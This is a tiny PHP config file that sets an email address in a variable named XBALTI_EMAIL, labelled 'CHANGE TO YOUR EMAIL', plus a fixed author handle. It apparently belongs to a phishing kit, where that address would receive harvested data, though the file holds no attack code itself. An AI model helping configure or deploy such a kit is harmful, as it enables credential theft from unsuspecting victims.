<?php


/*   

*/

//CHANGE TO YOUR EMAIL

$XBALTI_EMAIL = "thetentonline@gmail.com"; // Your Email Here :)


// DON'T TOUCH THIS\\\
$yourname = "imanhalal"; 

// DON'T TOUCH THIS\\\

?>

